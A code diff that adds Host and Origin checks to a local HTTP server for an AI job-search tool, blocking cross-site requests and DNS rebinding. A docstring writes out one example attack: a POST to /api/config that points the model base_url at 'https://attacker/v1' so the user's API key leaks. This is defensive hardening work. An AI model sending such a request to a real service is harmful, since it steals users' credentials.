@@ -1669,11 +1669,77 @@ def cleanup_failed_upload(interview_id, filename=""):
 
 
 # ---------------------------------------------------------------- HTTP
+# 来源校验（P2-1）的文案。**正常使用永远不该看到它**：页面本来就是本机的，
+# 所以看到这句话基本就等于"有别的网站在偷偷调用本机服务"（已拦下，什么都没执行）。
+FOREIGN_REQUEST_ERROR = (
+    "已拒绝：这个请求不是从本机页面（http://127.0.0.1:%d）发出的，所以没有执行任何操作。"
+    "如果你正在用本程序，请刷新 http://127.0.0.1:%d 的页面重试；"
+    "如果你刚才浏览过别的网页，那很可能是那个网页在偷偷调用本机的求职助手"
+    "（想改你的模型地址、或读走你的配置）—— 已经被拦下来了。"
+)
+
+
 class Handler(BaseHTTPRequestHandler):
     server_version = "AIJobSearch/2.0"
 
     def log_message(self, fmt, *args):
         pass
+
+    def _local_port(self):
+        """本服务**真正在监听**的端口。
+
+        优先取 `self.server.server_address[1]`：真实服务就是 PORT，测试里的临时端口也认得
+        （写死 PORT 的话，监听临时端口的用例会因为"端口不对"被误伤）。沙箱 handler 没有
+        `server` 属性，取不到就回落到模块级 `PORT`。
+        """
+        addr = getattr(getattr(self, "server", None), "server_address", None)
+        try:
+            return int(addr[1])
+        except (TypeError, IndexError, ValueError, KeyError):
+            return PORT
+
+    def _reject_foreign_request(self):
+        """来源校验（P2-1）：`Host` 必须是本机；带了 `Origin` 就必须同源。拒绝时已回 403。
+
+        **为什么必须做在服务端**：任意网页都能对本机服务发 `text/plain` 的**简单请求**
+        （不触发 CORS 预检），而 `_json_body` 不看 Content-Type —— 于是
+        `POST /api/config {"text_model":{"base_url":"https://attacker/v1"}}` 会**保留用户自己的
+        api_key**、只换掉地址，下一次分析就把 key 打到攻击者那里（连回包都不用读）。
+        同一条路还能销日志（毁掉取证线索）、写简历；没有 Host 校验时，域名重绑定下连
+        `GET /api/config`（明文回 api_key）都开着。
+
+        - `Host`：只认 `127.0.0.1:<port>` / `localhost:<port>`，端口取真正在监听的端口。
+          **缺 Host 一律放行**：HTTP/1.0 与命令行客户端不带它（tests/test_kb.py 的沙箱 handler
+          也不带），判它非法就会把既有测试和真实用法一起弄红；而 DNS rebinding 的浏览器
+          **必定**带 Host（那个 Host 正是攻击者的域名），所以放行缺 Host 不缩小防线。
+        - `Origin`：**不带就放行**（命令行 curl、双击 启动.bat 打开的页面都可能没有 Origin），
+          带了就必须是本机同源（`http://127.0.0.1:<port>` / `http://localhost:<port>`）。
+        - 刻意**不**要求 `Content-Type: application/json`：那不是来源判据，还会误伤
+          （tests/test_kb.py 的沙箱 handler 与不少真实调用都不设它）。
+        """
+        port = self._local_port()
+        host = str(self.headers.get("Host") or "").strip().lower()
+        origin = str(self.headers.get("Origin") or "").strip().lower()
+        allowed_hosts = ("127.0.0.1:%d" % port, "localhost:%d" % port)
+        allowed_origins = tuple("http://" + h for h in allowed_hosts)
+
+        if host and host not in allowed_hosts:
+            return self._deny_foreign("Host 不是本机", host, origin)
+        if origin and origin.rstrip("/") not in allowed_origins:
+            return self._deny_foreign("Origin 不是本机页面", host, origin)
+        return False
+
+    def _deny_foreign(self, why, host, origin):
+        """拒绝一个来源不明的请求：先记一条取证日志，再回 403 + 一句人话。"""
+        port = self._local_port()
+        try:
+            log.log_event("http.foreign_request_rejected", level="warn", reason=why,
+                          method=getattr(self, "command", ""), host=host, origin=origin,
+                          path=urlparse(getattr(self, "path", "")).path)
+        except Exception:
+            pass
+        self._send(403, {"ok": False, "error": FOREIGN_REQUEST_ERROR % (port, port)})
+        return True
 
     def _after(self, code):
         """请求结束记一条日志（只记 API 与首页，静态资源不记以免噪音）"""
@@ -1695,6 +1761,7 @@ class Handler(BaseHTTPRequestHandler):
         self.send_header("Content-Type", ctype)
         self.send_header("Content-Length", str(len(data)))
         self.send_header("Cache-Control", "no-store")
+        self.send_header("X-Content-Type-Options", "nosniff")
         self.end_headers()
         try:
             self.wfile.write(data)
@@ -1718,6 +1785,7 @@ class Handler(BaseHTTPRequestHandler):
         self.send_header("Content-Type", ctype)
         self.send_header("Content-Length", str(len(data)))
         self.send_header("Cache-Control", "no-store")
+        self.send_header("X-Content-Type-Options", "nosniff")
         self.end_headers()
         try:
             self.wfile.write(data)
@@ -1728,6 +1796,10 @@ class Handler(BaseHTTPRequestHandler):
     # ---- GET
     def do_GET(self):
         self._t0 = time.time()
+        # 来源校验放在**所有路由之前**（含静态文件与 /reports/*、/jd/*）：域名重绑定下
+        # 攻击者的页面连读都该读不到（P2-1）。do_POST / do_DELETE 走同一个函数。
+        if self._reject_foreign_request():
+            return
         u = urlparse(self.path)
         p, q = u.path, parse_qs(u.query)
 
@@ -2060,6 +2132,7 @@ class Handler(BaseHTTPRequestHandler):
             self.send_header("Content-Disposition",
                              'attachment; filename="ai-job-search-logs-%s.jsonl"' % log.SESSION_ID)
             self.send_header("Content-Length", str(len(data)))
+            self.send_header("X-Content-Type-Options", "nosniff")
             self.end_headers()
             try:
                 self.wfile.write(data)
@@ -2080,6 +2153,7 @@ class Handler(BaseHTTPRequestHandler):
             self.send_header("Content-Disposition",
                              "attachment; filename=\"logs.zip\"; filename*=UTF-8''%s" % quote(name))
             self.send_header("Content-Length", str(len(data)))
+            self.send_header("X-Content-Type-Options", "nosniff")
             self.end_headers()
             try:
                 self.wfile.write(data)
@@ -2092,6 +2166,8 @@ class Handler(BaseHTTPRequestHandler):
     # ---- POST
     def do_POST(self):
         self._t0 = time.time()
+        if self._reject_foreign_request():
+            return
         p = urlparse(self.path).path
         try:
             # 上传必须**先于 _json_body()** 分流：那个函数按 Content-Length 把整个 body 读进
@@ -2630,6 +2706,8 @@ class Handler(BaseHTTPRequestHandler):
     # ---- DELETE
     def do_DELETE(self):
         self._t0 = time.time()
+        if self._reject_foreign_request():
+            return
         try:
             return self._handle_delete()
         except Exception as e:
